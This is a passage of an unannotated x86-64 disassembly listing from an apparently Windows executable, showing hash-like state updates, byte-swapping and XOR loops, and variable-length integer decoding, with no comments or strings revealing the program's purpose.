   140050a62:	movaps xmm2,XMMWORD PTR [rbp+0xfa0]
   140050a69:	movaps xmm3,XMMWORD PTR [rbp+0xfb0]
   140050a70:	lea    rax,[rbp+0x1078]
   140050a77:	movups XMMWORD PTR [rax+0x30],xmm3
   140050a7b:	movups XMMWORD PTR [rax+0x20],xmm2
   140050a7f:	movups XMMWORD PTR [rax+0x10],xmm1
   140050a83:	movups XMMWORD PTR [rax],xmm0
   140050a86:	call   0x140064214
   140050a8b:	mov    al,BYTE PTR [rip+0x47ffc]        # 0x140098a8d
   140050a91:	cmp    al,0x1
   140050a93:	je     0x140050adc
   140050a95:	movzx  eax,al
   140050a98:	cmp    eax,0x2
   140050a9b:	je     0x140050b82
   140050aa1:	and    DWORD PTR [rbp+0x640],0x0
   140050aa8:	lea    rcx,[rip+0xfffffffffffb05d1]        # 0x140001080
   140050aaf:	mov    rdx,QWORD PTR [rbp+0x1150]
   140050ab6:	push   0x40
   140050ab8:	pop    r8
   140050aba:	lea    r9,[rbp+0x640]
   140050ac1:	call   QWORD PTR [rip+0x43d41]        # 0x140094808
   140050ac7:	test   eax,eax
   140050ac9:	sete   cl
   140050acc:	inc    cl
   140050ace:	mov    BYTE PTR [rip+0x47fb9],cl        # 0x140098a8d
   140050ad4:	test   eax,eax
   140050ad6:	je     0x140050b82
   140050adc:	mov    al,BYTE PTR [rip+0x480d6]        # 0x140098bb8
   140050ae2:	cmp    al,0x1
   140050ae4:	je     0x140050b09
   140050ae6:	movzx  eax,al
   140050ae9:	test   eax,eax
   140050aeb:	jne    0x140050b82
   140050af1:	call   0x140065d51
   140050af6:	test   rax,rax
   140050af9:	sete   cl
   140050afc:	inc    cl
   140050afe:	mov    BYTE PTR [rip+0x480b4],cl        # 0x140098bb8
   140050b04:	test   rax,rax
   140050b07:	je     0x140050b82
   140050b09:	call   0x140064227
   140050b0e:	mov    eax,0xc8c291de
   140050b13:	xchg   DWORD PTR [rip+0x47fc7],eax        # 0x140098ae0
   140050b19:	call   QWORD PTR [rip+0x43b31]        # 0x140094650
   140050b1f:	mov    eax,eax
   140050b21:	mov    QWORD PTR [rip+0x474d8],rax        # 0x140098000
   140050b28:	lea    rcx,[rbp+0x1060]
   140050b2f:	push   0xffffffffffffffff
   140050b31:	pop    rdx
   140050b32:	call   0x14002b840
   140050b37:	xor    eax,eax
   140050b39:	xchg   DWORD PTR [rip+0x47fa1],eax        # 0x140098ae0
   140050b3f:	mov    BYTE PTR [rip+0x47f48],0x0        # 0x140098a8e
   140050b46:	mov    eax,DWORD PTR [rbp+0x1060]
   140050b4c:	add    DWORD PTR [rbp+0x848],eax
   140050b52:	mov    eax,DWORD PTR [rbp+0x1064]
   140050b58:	add    DWORD PTR [rbp+0x84c],eax
   140050b5e:	mov    eax,DWORD PTR [rbp+0x1068]
   140050b64:	add    DWORD PTR [rbp+0x850],eax
   140050b6a:	mov    eax,DWORD PTR [rbp+0x106c]
   140050b70:	add    DWORD PTR [rbp+0x854],eax
   140050b76:	mov    eax,DWORD PTR [rbp+0x1070]
   140050b7c:	add    DWORD PTR [rbp+0x858],eax
   140050b82:	mov    BYTE PTR [rip+0x47f03],0x0        # 0x140098a8c
   140050b89:	movaps XMMWORD PTR [rbp+0x1080],xmm7
   140050b90:	movaps XMMWORD PTR [rbp+0x1070],xmm7
   140050b97:	movaps XMMWORD PTR [rbp+0x1060],xmm7
   140050b9e:	xor    eax,eax
   140050ba0:	cmp    rax,0x14
   140050ba4:	je     0x140050bbc
   140050ba6:	mov    ecx,DWORD PTR [rbp+rax*1+0x848]
   140050bad:	bswap  ecx
   140050baf:	mov    DWORD PTR [rbp+rax*1+0x1060],ecx
   140050bb6:	add    rax,0x4
   140050bba:	jmp    0x140050ba0
   140050bbc:	mov    rsi,QWORD PTR [rbp+0x7e0]
   140050bc3:	mov    eax,r13d
   140050bc6:	shr    eax,0x3
   140050bc9:	and    eax,0x1f
   140050bcc:	lea    rcx,[rax+rbp*1]
   140050bd0:	add    rcx,0x1060
   140050bd7:	xor    r8d,r8d
   140050bda:	xor    edx,edx
   140050bdc:	xor    eax,eax
   140050bde:	cmp    r8,0x10
   140050be2:	je     0x140050bfd
   140050be4:	shld   rax,rdx,0x8
   140050be9:	mov    r9,rdx
   140050bec:	shl    r9,0x8
   140050bf0:	movzx  edx,BYTE PTR [rcx+r8*1]
   140050bf5:	inc    r8
   140050bf8:	or     rdx,r9
   140050bfb:	jmp    0x140050bde
   140050bfd:	push   0xffffffffffffffff
   140050bff:	pop    r8
   140050c01:	mov    r9,r8
   140050c04:	mov    ecx,esi
   140050c06:	shl    r9,cl
   140050c09:	cmp    rsi,0x40
   140050c0d:	not    r9
   140050c10:	cmovae r9,r8
   140050c14:	and    r13d,0x7
   140050c18:	lea    ecx,[rsi+r13*1]
   140050c1c:	neg    cl
   140050c1e:	shrd   rdx,rax,cl
   140050c22:	shr    rax,cl
   140050c25:	test   cl,0x40
   140050c28:	cmove  rax,rdx
   140050c2c:	and    rax,r9
   140050c2f:	mov    r15,QWORD PTR [rbp+0x820]
   140050c36:	lea    r10,[rsi+0x7]
   140050c3a:	bswap  rax
   140050c3d:	shr    r10,0x3
   140050c41:	mov    QWORD PTR [rbp+0xf80],rax
   140050c48:	mov    r8,r15
   140050c4b:	imul   r8,r10
   140050c4f:	push   0x8
   140050c51:	pop    rcx
   140050c52:	sub    rcx,r10
   140050c55:	dec    r10
   140050c58:	mov    rax,QWORD PTR [rbp+0x1158]
   140050c5f:	lea    r11,[rax+r8*1]
   140050c63:	mov    rax,r8
   140050c66:	xor    edx,edx
   140050c68:	push   0x14
   140050c6a:	pop    rdi
   140050c6b:	div    rdi
   140050c6e:	cmp    rcx,0x8
   140050c72:	je     0x140050c98
   140050c74:	cmp    r10,0x7
   140050c78:	ja     0x140059d80
   140050c7e:	imul   rax,rax,0xffffffffffffffec
   140050c82:	mov    al,BYTE PTR [r11+rax*1]
   140050c86:	xor    BYTE PTR [rbp+rcx*1+0xf80],al
   140050c8d:	inc    rcx
   140050c90:	inc    r11
   140050c93:	inc    r8
   140050c96:	jmp    0x140050c63
   140050c98:	mov    rdx,QWORD PTR [rbp+0xf80]
   140050c9f:	bswap  rdx
   140050ca2:	and    rdx,r9
   140050ca5:	inc    r15
   140050ca8:	mov    QWORD PTR [rbp+0x820],r15
   140050caf:	mov    rax,QWORD PTR [rbp+0x890]
   140050cb6:	mov    QWORD PTR [rbp+0x1180],rax
   140050cbd:	mov    r14,QWORD PTR [rbp+0x888]
   140050cc4:	mov    r13,QWORD PTR [rbp+0x880]
   140050ccb:	mov    rdi,QWORD PTR [rbp+0x870]
   140050cd2:	mov    r12,QWORD PTR [rbp+0x878]
   140050cd9:	mov    rax,QWORD PTR [rbp+0x1180]
   140050ce0:	sub    rax,r14
   140050ce3:	sub    rax,r13
   140050ce6:	cmp    rax,rsi
   140050ce9:	cmovae rax,rsi
   140050ced:	cmp    rax,0x1
   140050cf1:	adc    rax,0x0
   140050cf5:	mov    ecx,esi
   140050cf7:	sub    ecx,eax
   140050cf9:	and    cl,0x3f
   140050cfc:	cmp    rsi,rax
   140050cff:	movzx  ecx,cl
   140050d02:	mov    r8d,0x0
   140050d08:	cmovbe ecx,r8d
   140050d0c:	shr    rdx,cl
   140050d0f:	mov    ecx,eax
   140050d11:	shld   r12,rdi,cl
   140050d15:	shl    rdi,cl
   140050d18:	test   al,0x40
   140050d1a:	cmovne r12,rdi
   140050d1e:	mov    ecx,0x0
   140050d23:	cmove  rcx,rdi
   140050d27:	or     rcx,rdx
   140050d2a:	mov    QWORD PTR [rbp+0x878],r12
   140050d31:	mov    QWORD PTR [rbp+0x870],rcx
   140050d38:	add    r13,rax
   140050d3b:	mov    QWORD PTR [rbp+0x880],r13
   140050d42:	mov    rdi,rcx
   140050d45:	jmp    0x1400507f8
   140050d4a:	add    r13,0xfffffffffffffff8
   140050d4e:	mov    rax,rdi
   140050d51:	mov    ecx,r13d
   140050d54:	shrd   rax,r12,cl
   140050d58:	mov    rdx,r12
   140050d5b:	shr    rdx,cl
   140050d5e:	push   0xffffffffffffffff
   140050d60:	pop    r9
   140050d62:	mov    r8,r9
   140050d65:	shl    r8,cl
   140050d68:	test   r13b,0x40
   140050d6c:	cmove  rdx,rax
   140050d70:	mov    rax,r9
   140050d73:	cmovne rax,r8
   140050d77:	mov    ecx,0x0
   140050d7c:	cmove  rcx,r8
   140050d80:	mov    QWORD PTR [rbp+0x880],r13
   140050d87:	not    rcx
   140050d8a:	not    rax
   140050d8d:	and    rax,r12
   140050d90:	and    rcx,rdi
   140050d93:	test   r13,r13
   140050d96:	cmove  rcx,r13
   140050d9a:	cmove  rax,r13
   140050d9e:	mov    QWORD PTR [rbp+0x878],rax
   140050da5:	mov    QWORD PTR [rbp+0x870],rcx
   140050dac:	add    r14,0x8
   140050db0:	mov    QWORD PTR [rbp+0x888],r14
   140050db7:	mov    rdi,rcx
   140050dba:	mov    r12,rax
   140050dbd:	inc    QWORD PTR [rbp+0x1148]
   140050dc4:	lea    rcx,[rbp+0x710]
   140050dcb:	call   0x14003c141
   140050dd0:	jmp    0x1400507d6
   140050dd5:	mov    r12,QWORD PTR [rbp+0x710]
   140050ddc:	mov    r13,QWORD PTR [rbp+0x718]
   140050de3:	mov    rdi,QWORD PTR [rbp+0x720]
   140050dea:	mov    rcx,r13
   140050ded:	mov    rdx,rdi
   140050df0:	xor    r8d,r8d
   140050df3:	lea    r9,[rip+0x371fe]        # 0x140087ff8
   140050dfa:	call   0x14003c1d3
   140050dff:	movzx  r14d,BYTE PTR [rax]
   140050e03:	mov    rcx,r13
   140050e06:	mov    rdx,rdi
   140050e09:	push   0x1
   140050e0b:	pop    r8
   140050e0d:	lea    r9,[rip+0x371fc]        # 0x140088010
   140050e14:	call   0x14003c1d3
   140050e19:	movzx  esi,BYTE PTR [rax]
   140050e1c:	mov    rcx,r13
   140050e1f:	mov    rdx,rdi
   140050e22:	push   0x2
   140050e24:	pop    r8
   140050e26:	lea    r9,[rip+0x371fb]        # 0x140088028
   140050e2d:	call   0x14003c1d3
   140050e32:	movzx  r15d,BYTE PTR [rax]
   140050e36:	mov    rcx,r13
   140050e39:	mov    rdx,rdi
   140050e3c:	push   0x3
   140050e3e:	pop    r8
   140050e40:	lea    r9,[rip+0x371f9]        # 0x140088040
   140050e47:	call   0x14003c1d3
   140050e4c:	movzx  eax,BYTE PTR [rax]
   140050e4f:	shl    eax,0x18
   140050e52:	shl    r15d,0x10
   140050e56:	shl    esi,0x8
   140050e59:	or     rsi,r14
   140050e5c:	or     rsi,r15
   140050e5f:	or     rsi,rax
   140050e62:	mov    rcx,QWORD PTR [rbp+0x1138]
   140050e69:	shr    rcx,0x3
   140050e6d:	inc    rcx
   140050e70:	mov    rax,rsi
   140050e73:	xor    edx,edx
   140050e75:	div    rcx
   140050e78:	lea    rax,[rdx*8+0x20]
   140050e80:	mov    QWORD PTR [rbp+0x890],rax
   140050e87:	mov    QWORD PTR [rbp+0x810],rdx
   140050e8e:	mov    ecx,0xc8
   140050e93:	lea    r14,[rbp+0x1060]
   140050e9a:	mov    rdi,r14
   140050e9d:	lea    rsi,[rbp+0x7d8]
   140050ea4:	rep movs BYTE PTR [rdi],BYTE PTR [rsi]
   140050ea6:	mov    rcx,r12
   140050ea9:	mov    rdx,r13
   140050eac:	call   0x14006f7f7
   140050eb1:	lea    rax,[rbx+0x10]
   140050eb5:	mov    QWORD PTR [rbp+0xd10],rax
   140050ebc:	mov    ecx,0xc8
   140050ec1:	lea    rdi,[rbp+0xd18]
   140050ec8:	mov    rsi,r14
   140050ecb:	rep movs BYTE PTR [rdi],BYTE PTR [rsi]
   140050ecd:	mov    r12,QWORD PTR [rbp+0xd50]
   140050ed4:	sub    r12,0x82
   140050edb:	mov    eax,0x0
   140050ee0:	cmovb  r12,rax
   140050ee4:	cmp    r12,0x1
   140050ee8:	mov    QWORD PTR [rbp+0x7a0],r12
   140050eef:	adc    r12,0x0
   140050ef3:	mov    QWORD PTR [rbp+0xf70],r12
   140050efa:	shr    r12,0x4
   140050efe:	cmp    r12,0x1
   140050f02:	adc    r12,0x0
   140050f06:	lea    rcx,[rbp+0x500]
   140050f0d:	push   0x40
   140050f0f:	pop    rdx
   140050f10:	call   0x14003c111
   140050f15:	xor    r14d,r14d
   140050f18:	cmp    r14,0x40
   140050f1c:	je     0x14005152c
   140050f22:	mov    r8,QWORD PTR [rbp+0xdc8]
   140050f29:	mov    r9,QWORD PTR [rbp+0xdd0]
   140050f30:	lea    rax,[r8+0x8]
   140050f34:	cmp    rax,r9
   140050f37:	jbe    0x140050f40
   140050f39:	xor    edx,edx
   140050f3b:	jmp    0x140051518
   140050f40:	mov    rax,QWORD PTR [rbp+0xdc0]
   140050f47:	cmp    rax,0x8
   140050f4b:	jae    0x1400514a4
   140050f51:	mov    rcx,QWORD PTR [rbp+0xd60]
   140050f58:	cmp    rcx,QWORD PTR [rbp+0xd68]
   140050f5f:	jae    0x140050fa5
   140050f61:	mov    rcx,QWORD PTR [rbp+0xd18]
   140050f68:	mov    rdx,QWORD PTR [rbp+0xd58]
   140050f6f:	cmp    rdx,rcx
   140050f72:	jae    0x140050fa5
   140050f74:	lea    rax,[rbx+0x10]
   140050f78:	movzx  r13d,BYTE PTR [rax+rdx*1]
   140050f7d:	and    r13d,0x7f
   140050f81:	lea    rax,[rdx+0x1]
   140050f85:	cmp    rax,rcx
   140050f88:	jae    0x140050fb3
   140050f8a:	movzx  r8d,BYTE PTR [rbx+rdx*1+0x11]
   140050f90:	test   r8b,r8b
   140050f93:	jns    0x140050fad
   140050f95:	shl    r13,0x7
   140050f99:	and    r8d,0x7f
   140050f9d:	or     r13,r8
   140050fa0:	mov    rdx,rax
   140050fa3:	jmp    0x140050f81
   140050fa5:	xor    r11d,r11d
   140050fa8:	jmp    0x140051420
   140050fad:	inc    rdx
   140050fb0:	mov    rcx,rdx
   140050fb3:	mov    QWORD PTR [rbp+0xd58],rcx
   140050fba:	mov    rax,r13
   140050fbd:	shr    rax,0x8
   140050fc1:	mov    rsi,r13
   140050fc4:	shr    rsi,0x28
   140050fc8:	movaps XMMWORD PTR [rbp+0xfb0],xmm7
   140050fcf:	movaps XMMWORD PTR [rbp+0xfa0],xmm7
   140050fd6:	movaps XMMWORD PTR [rbp+0xf90],xmm7
   140050fdd:	movaps XMMWORD PTR [rbp+0xf80],xmm7
   140050fe4:	mov    DWORD PTR [rbp+0x7d0],eax
   140050fea:	lea    rax,[rip+0x37067]        # 0x140088058
   140050ff1:	mov    QWORD PTR [rsp+0x20],rax
   140050ff6:	lea    rcx,[rbp+0xf80]
   140050ffd:	push   0x4
   140050fff:	pop    rdx
   140051000:	lea    r8,[rbp+0x7d0]
   140051007:	mov    r9,rdx
   14005100a:	call   0x1400638fe
   14005100f:	mov    BYTE PTR [rbp+0xf84],sil
   140051016:	mov    rsi,QWORD PTR [rbp+0xd30]
   14005101d:	cmp    QWORD PTR [rbp+0xd78],rsi
   140051024:	jbe    0x140051154
   14005102a:	mov    r9,QWORD PTR [rbp+0xd38]
   140051031:	cmp    r9,0x4
   140051035:	ja     0x140059d9c
   14005103b:	mov    rcx,QWORD PTR [rbp+0xd40]
   140051042:	cmp    rcx,0x5
   140051046:	jae    0x140059dae
   14005104c:	mov    r8,QWORD PTR [rbp+0xd78]
   140051053:	cmp    r8,rsi
   140051056:	je     0x140059dbc
   14005105c:	mov    eax,DWORD PTR [rbp+rcx*4+0xd88]
   140051063:	mov    cl,BYTE PTR [rbp+0xd48]
   140051069:	rol    eax,cl
   14005106b:	sub    r8,rsi
   14005106e:	xor    eax,DWORD PTR [rbp+r9*4+0xd88]
   140051076:	xor    edx,edx
   140051078:	div    r8
   14005107b:	mov    rdi,rdx
   14005107e:	mov    rax,QWORD PTR [rbp+0xd80]
   140051085:	mov    QWORD PTR [rbp+0x1060],rax
   14005108c:	cmp    rsi,0x40
   140051090:	push   0x40
   140051092:	pop    rax
   140051093:	cmovae rsi,rax
   140051097:	movaps XMMWORD PTR [rbp+0x800],xmm7
   14005109e:	movaps XMMWORD PTR [rbp+0x7f0],xmm7
   1400510a5:	movaps XMMWORD PTR [rbp+0x7e0],xmm7
   1400510ac:	movaps XMMWORD PTR [rbp+0x7d0],xmm7
   1400510b3:	lea    rcx,[rbp+0x7d0]
   1400510ba:	mov    rdx,rsi
   1400510bd:	call   0x14003c0b8
   1400510c2:	mov    r10,QWORD PTR [rbp+0xd78]
   1400510c9:	test   r10,r10
   1400510cc:	je     0x14005111a
   1400510ce:	mov    rcx,rax
   1400510d1:	mov    r8,rdx
   1400510d4:	mov    rax,rdx
   1400510d7:	add    rax,rdi
   1400510da:	mov    r9,QWORD PTR [rbp+0xd70]
   1400510e1:	cmp    rax,r10
   1400510e4:	jbe    0x140051104
   1400510e6:	xor    r11d,r11d
   1400510e9:	cmp    r8,r11
   1400510ec:	je     0x14005111a
   1400510ee:	lea    rax,[r11+rdi*1]
   1400510f2:	xor    edx,edx
   1400510f4:	div    r10
   1400510f7:	mov    al,BYTE PTR [r9+rdx*1]
   1400510fb:	mov    BYTE PTR [rcx+r11*1],al
   1400510ff:	inc    r11
   140051102:	jmp    0x1400510e9
   140051104:	add    r9,rdi
   140051107:	xor    eax,eax
   140051109:	cmp    r8,rax
   14005110c:	je     0x14005111a
   14005110e:	mov    dl,BYTE PTR [r9+rax*1]
   140051112:	mov    BYTE PTR [rcx+rax*1],dl
   140051115:	inc    rax
   140051118:	jmp    0x140051109
   14005111a:	mov    rcx,QWORD PTR [rbp+0xd28]
   140051121:	xor    eax,eax
   140051123:	cmp    rsi,rax
   140051126:	je     0x140051154
   140051128:	cmp    rcx,0x3f
   14005112c:	ja     0x140059d8e
   140051132:	mov    edx,eax
   140051134:	and    edx,0x7
   140051137:	mov    dl,BYTE PTR [rbp+rdx*1+0x1060]
   14005113e:	xor    dl,BYTE PTR [rbp+rax*1+0x7d0]
   140051145:	inc    rax
   140051148:	mov    BYTE PTR [rbp+rcx*1+0xf80],dl
   14005114f:	inc    rcx
   140051152:	jmp    0x140051123
   140051154:	movaps XMMWORD PTR [rbp+0x1090],xmm7
   14005115b:	movaps XMMWORD PTR [rbp+0x1080],xmm7
   140051162:	movaps XMMWORD PTR [rbp+0x1070],xmm7
   140051169:	movaps XMMWORD PTR [rbp+0x1060],xmm7
   140051170:	xor    eax,eax
   140051172:	cmp    rax,0x40
   140051176:	je     0x14005118e
   140051178:	mov    ecx,DWORD PTR [rbp+rax*1+0xf80]
   14005117f:	bswap  ecx
   140051181:	mov    DWORD PTR [rbp+rax*1+0x1060],ecx
   140051188:	add    rax,0x4
   14005118c:	jmp    0x140051172
   14005118e:	movups xmm0,XMMWORD PTR [rbp+0xd88]
   140051195:	mov    eax,DWORD PTR [rbp+0xd98]
   14005119b:	movups XMMWORD PTR [rbp+0x7d0],xmm0
   1400511a2:	mov    DWORD PTR [rbp+0x7e0],eax
   1400511a8:	and    DWORD PTR [rbp+0x7e4],0x0
   1400511af:	movaps xmm0,XMMWORD PTR [rbp+0x1060]
   1400511b6:	movaps xmm1,XMMWORD PTR [rbp+0x1070]
   1400511bd:	movaps xmm2,XMMWORD PTR [rbp+0x1080]
   1400511c4:	movaps xmm3,XMMWORD PTR [rbp+0x1090]
   1400511cb:	lea    rax,[rbp+0x7e8]
   1400511d2:	movups XMMWORD PTR [rax+0x30],xmm3
   1400511d6:	movups XMMWORD PTR [rax+0x20],xmm2
   1400511da:	movups XMMWORD PTR [rax+0x10],xmm1
   1400511de:	movups XMMWORD PTR [rax],xmm0
   1400511e1:	call   0x140064214
   1400511e6:	mov    al,BYTE PTR [rip+0x478a1]        # 0x140098a8d
   1400511ec:	cmp    al,0x1
   1400511ee:	je     0x140051237
   1400511f0:	movzx  eax,al
   1400511f3:	cmp    eax,0x2
   1400511f6:	je     0x1400512dd
   1400511fc:	and    DWORD PTR [rbp+0x710],0x0
   140051203:	lea    rcx,[rip+0xfffffffffffafe76]        # 0x140001080
   14005120a:	mov    rdx,QWORD PTR [rbp+0x1150]
   140051211:	push   0x40
   140051213:	pop    r8
   140051215:	lea    r9,[rbp+0x710]
   14005121c:	call   QWORD PTR [rip+0x435e6]        # 0x140094808
   140051222:	test   eax,eax
   140051224:	sete   cl
   140051227:	inc    cl
   140051229:	mov    BYTE PTR [rip+0x4785e],cl        # 0x140098a8d
   14005122f:	test   eax,eax
   140051231:	je     0x1400512dd
   140051237:	mov    al,BYTE PTR [rip+0x4797b]        # 0x140098bb8
   14005123d:	cmp    al,0x1
   14005123f:	je     0x140051264
   140051241:	movzx  eax,al
   140051244:	test   eax,eax
   140051246:	jne    0x1400512dd
   14005124c:	call   0x140065d51
   140051251:	test   rax,rax
   140051254:	sete   cl
   140051257:	inc    cl
   140051259:	mov    BYTE PTR [rip+0x47959],cl        # 0x140098bb8
   14005125f:	test   rax,rax
   140051262:	je     0x1400512dd
   140051264:	call   0x140064227
   140051269:	mov    eax,0xc8c291de
   14005126e:	xchg   DWORD PTR [rip+0x4786c],eax        # 0x140098ae0
   140051274:	call   QWORD PTR [rip+0x433d6]        # 0x140094650
   14005127a:	mov    eax,eax
   14005127c:	mov    QWORD PTR [rip+0x46d7d],rax        # 0x140098000
   140051283:	lea    rcx,[rbp+0x7d0]
   14005128a:	push   0xffffffffffffffff
   14005128c:	pop    rdx
   14005128d:	call   0x14002b840
   140051292:	xor    eax,eax
   140051294:	xchg   DWORD PTR [rip+0x47846],eax        # 0x140098ae0
   14005129a:	mov    BYTE PTR [rip+0x477ed],0x0        # 0x140098a8e
   1400512a1:	mov    eax,DWORD PTR [rbp+0x7d0]
   1400512a7:	add    DWORD PTR [rbp+0xd88],eax
   1400512ad:	mov    eax,DWORD PTR [rbp+0x7d4]
   1400512b3:	add    DWORD PTR [rbp+0xd8c],eax
   1400512b9:	mov    eax,DWORD PTR [rbp+0x7d8]
   1400512bf:	add    DWORD PTR [rbp+0xd90],eax
   1400512c5:	mov    eax,DWORD PTR [rbp+0x7dc]
   1400512cb:	add    DWORD PTR [rbp+0xd94],eax
   1400512d1:	mov    eax,DWORD PTR [rbp+0x7e0]
   1400512d7:	add    DWORD PTR [rbp+0xd98],eax
   1400512dd:	mov    BYTE PTR [rip+0x477a8],0x0        # 0x140098a8c
   1400512e4:	movaps XMMWORD PTR [rbp+0x7f0],xmm7
   1400512eb:	movaps XMMWORD PTR [rbp+0x7e0],xmm7
   1400512f2:	movaps XMMWORD PTR [rbp+0x7d0],xmm7
   1400512f9:	xor    eax,eax
   1400512fb:	cmp    rax,0x14
   1400512ff:	je     0x140051317
   140051301:	mov    ecx,DWORD PTR [rbp+rax*1+0xd88]
   140051308:	bswap  ecx
   14005130a:	mov    DWORD PTR [rbp+rax*1+0x7d0],ecx
   140051311:	add    rax,0x4
   140051315:	jmp    0x1400512fb
   140051317:	mov    r8,QWORD PTR [rbp+0xd20]
   14005131e:	mov    eax,r13d
   140051321:	shr    eax,0x3
   140051324:	and    eax,0x1f
   140051327:	lea    rcx,[rax+rbp*1]
   14005132b:	add    rcx,0x7d0
   140051332:	xor    r9d,r9d
   140051335:	xor    edx,edx
   140051337:	xor    eax,eax
   140051339:	cmp    r9,0x10
   14005133d:	je     0x140051358
   14005133f:	shld   rax,rdx,0x8
   140051344:	mov    r10,rdx
   140051347:	shl    r10,0x8
   14005134b:	movzx  edx,BYTE PTR [rcx+r9*1]
   140051350:	inc    r9
   140051353:	or     rdx,r10
   140051356:	jmp    0x140051339
   140051358:	push   0xffffffffffffffff
   14005135a:	pop    r9
   14005135c:	mov    r10,r9
   14005135f:	mov    ecx,r8d
   140051362:	shl    r10,cl
   140051365:	cmp    r8,0x40
   140051369:	not    r10
   14005136c:	cmovae r10,r9
   140051370:	and    r13d,0x7
   140051374:	lea    ecx,[r8+r13*1]
   140051378:	neg    cl
   14005137a:	shrd   rdx,rax,cl
   14005137e:	shr    rax,cl
   140051381:	test   cl,0x40
   140051384:	cmove  rax,rdx
   140051388:	and    rax,r10
   14005138b:	mov    rsi,QWORD PTR [rbp+0xd60]
   140051392:	add    r8,0x7
   140051396:	bswap  rax
   140051399:	shr    r8,0x3
   14005139d:	mov    QWORD PTR [rbp+0x1060],rax
   1400513a4:	mov    r9,rsi
   1400513a7:	imul   r9,r8
   1400513ab:	push   0x8
   1400513ad:	pop    rcx
   1400513ae:	sub    rcx,r8
   1400513b1:	dec    r8
   1400513b4:	mov    rax,QWORD PTR [rbp+0x1168]
   1400513bb:	lea    r11,[rax+r9*1]
   1400513bf:	mov    rax,r9
   1400513c2:	xor    edx,edx
   1400513c4:	push   0x14
   1400513c6:	pop    rdi
   1400513c7:	div    rdi
   1400513ca:	cmp    rcx,0x8
   1400513ce:	je     0x1400513f4
   1400513d0:	cmp    r8,0x7
   1400513d4:	ja     0x140059d80
   1400513da:	imul   rax,rax,0xffffffffffffffec
   1400513de:	mov    al,BYTE PTR [r11+rax*1]
   1400513e2:	xor    BYTE PTR [rbp+rcx*1+0x1060],al
   1400513e9:	inc    rcx
   1400513ec:	inc    r11
   1400513ef:	inc    r9
   1400513f2:	jmp    0x1400513bf
   1400513f4:	mov    r11,QWORD PTR [rbp+0x1060]
   1400513fb:	bswap  r11
   1400513fe:	and    r11,r10
   140051401:	inc    rsi
   140051404:	mov    QWORD PTR [rbp+0xd60],rsi
   14005140b:	mov    r9,QWORD PTR [rbp+0xdd0]
   140051412:	mov    rax,QWORD PTR [rbp+0xdc0]
   140051419:	mov    r8,QWORD PTR [rbp+0xdc8]
   140051420:	mov    rdx,r9
   140051423:	sub    rdx,r8
   140051426:	sub    rdx,rax
   140051429:	mov    rcx,QWORD PTR [rbp+0xd20]
   140051430:	cmp    rdx,rcx
   140051433:	cmovae rdx,rcx
   140051437:	cmp    rdx,0x1
   14005143b:	adc    rdx,0x0
   14005143f:	mov    r10d,ecx
   140051442:	sub    r10d,edx
   140051445:	and    r10b,0x3f
   140051449:	cmp    rcx,rdx
   14005144c:	movzx  ecx,r10b
   140051450:	mov    r10d,0x0
   140051456:	cmovbe ecx,r10d
   14005145a:	shr    r11,cl
   14005145d:	mov    r10,QWORD PTR [rbp+0xdb0]
   140051464:	mov    rsi,QWORD PTR [rbp+0xdb8]
   14005146b:	mov    ecx,edx
   14005146d:	shld   rsi,r10,cl
   140051471:	shl    r10,cl
   140051474:	test   dl,0x40
   140051477:	cmovne rsi,r10
   14005147b:	mov    ecx,0x0
   140051480:	cmove  rcx,r10
   140051484:	or     rcx,r11
   140051487:	mov    QWORD PTR [rbp+0xdb8],rsi
   14005148e:	mov    QWORD PTR [rbp+0xdb0],rcx
   140051495:	add    rax,rdx
   140051498:	mov    QWORD PTR [rbp+0xdc0],rax
   14005149f:	jmp    0x140050f47
   1400514a4:	add    rax,0xfffffffffffffff8
   1400514a8:	mov    QWORD PTR [rbp+0xdc0],rax
   1400514af:	mov    r9,QWORD PTR [rbp+0xdb8]
   1400514b6:	mov    r10,r9
   1400514b9:	mov    ecx,eax
   1400514bb:	shr    r10,cl
   1400514be:	mov    r11,QWORD PTR [rbp+0xdb0]
   1400514c5:	mov    rdx,r11
   1400514c8:	shrd   rdx,r9,cl
   1400514cc:	push   0xffffffffffffffff
   1400514ce:	pop    rdi
   1400514cf:	mov    rsi,rdi
   1400514d2:	shl    rsi,cl
   1400514d5:	test   al,0x40
   1400514d7:	cmovne rdx,r10
   1400514db:	mov    ecx,0x0
   1400514e0:	cmove  rcx,rsi
   1400514e4:	cmove  rsi,rdi
   1400514e8:	not    rsi
   1400514eb:	not    rcx
   1400514ee:	and    rcx,r11
   1400514f1:	and    rsi,r9
   1400514f4:	test   rax,rax
   1400514f7:	cmove  rsi,rax
   1400514fb:	cmove  rcx,rax
   1400514ff:	mov    QWORD PTR [rbp+0xdb0],rcx
   140051506:	mov    QWORD PTR [rbp+0xdb8],rsi
   14005150d:	add    r8,0x8
   140051511:	mov    QWORD PTR [rbp+0xdc8],r8
   140051518:	inc    r14
   14005151b:	lea    rcx,[rbp+0x500]
   140051522:	call   0x14003c141
   140051527:	jmp    0x140050f18
   14005152c:	mov    rax,QWORD PTR [rbp+0x500]
   140051533:	mov    QWORD PTR [rbp+0x1138],rax
   14005153a:	mov    rax,QWORD PTR [rbp+0x508]
   140051541:	mov    QWORD PTR [rbp+0x1148],rax
   140051548:	mov    rax,QWORD PTR [rbp+0x510]
   14005154f:	mov    QWORD PTR [rbp+0x1180],rax
   140051556:	lea    rcx,[rbp+0x500]
   14005155d:	push   0x3a
   14005155f:	pop    rdx
   140051560:	call   0x14003c111
   140051565:	xor    r14d,r14d
   140051568:	cmp    r14,0x3a
   14005156c:	je     0x140051b7c
   140051572:	mov    r8,QWORD PTR [rbp+0xdc8]
   140051579:	mov    r9,QWORD PTR [rbp+0xdd0]
   140051580:	lea    rax,[r8+0x8]
   140051584:	cmp    rax,r9
   140051587:	jbe    0x140051590
   140051589:	xor    edx,edx
   14005158b:	jmp    0x140051b68
   140051590:	mov    rax,QWORD PTR [rbp+0xdc0]
   140051597:	cmp    rax,0x8
   14005159b:	jae    0x140051af4
   1400515a1:	mov    rcx,QWORD PTR [rbp+0xd60]
   1400515a8:	cmp    rcx,QWORD PTR [rbp+0xd68]
   1400515af:	jae    0x1400515f5
   1400515b1:	mov    rcx,QWORD PTR [rbp+0xd18]
   1400515b8:	mov    rdx,QWORD PTR [rbp+0xd58]
   1400515bf:	cmp    rdx,rcx
   1400515c2:	jae    0x1400515f5
   1400515c4:	lea    rax,[rbx+0x10]
   1400515c8:	movzx  r13d,BYTE PTR [rax+rdx*1]
   1400515cd:	and    r13d,0x7f
   1400515d1:	lea    rax,[rdx+0x1]
   1400515d5:	cmp    rax,rcx
   1400515d8:	jae    0x140051603
